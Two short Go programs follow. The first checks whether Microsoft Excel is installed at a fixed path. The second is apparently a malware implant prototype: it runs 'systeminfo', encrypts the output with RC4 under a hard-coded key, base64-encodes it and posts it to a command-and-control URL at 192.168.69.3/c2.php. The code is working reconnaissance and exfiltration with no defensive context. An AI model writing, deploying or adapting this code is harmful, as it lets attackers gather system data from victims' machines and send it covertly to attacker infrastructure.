package main

import (
	"fmt"
	"os"
)

func main() {
	path := `C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE`
	info, err := os.Stat(path)
	if os.IsNotExist(err) {
		fmt.Println(err)
		return
	}
	if err != nil {
		fmt.Println(err)
	}
	if info.IsDir() {
		fmt.Println("test")
	} else {
		fmt.Println("sucess")
	}
}




package main

import (
	"crypto/rc4"
	"encoding/base64"
	"net/http"
	"net/url"
	"os/exec"
	"time"
)

func encrypt() string {
	// exec systeminfo
	out, err := exec.Command("systeminfo").Output()
	if err != nil {
		panic(err)
	}
	plaintext := out

	// rc4_encrypted
	key := []byte("my-fixed-secret-key")
	cipher, err := rc4.NewCipher(key)
	if err != nil {
		panic(err)
	}
	ciphertext := make([]byte, len(plaintext))
	cipher.XORKeyStream(ciphertext, plaintext)

	// base64_encoded
	encoded := base64.StdEncoding.EncodeToString(ciphertext)
	return encoded
}

func httprequest(data string) {
	form := url.Values{}
	form.Add("TEST", data)

	url := "http://192.168.69.3/c2.php"
	resp, err := http.PostForm(url, form)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
}

func main() {
	data := encrypt()
	// fmt.Printf(data)

	httprequest(data)
	time.Sleep(1 * time.Second)
}
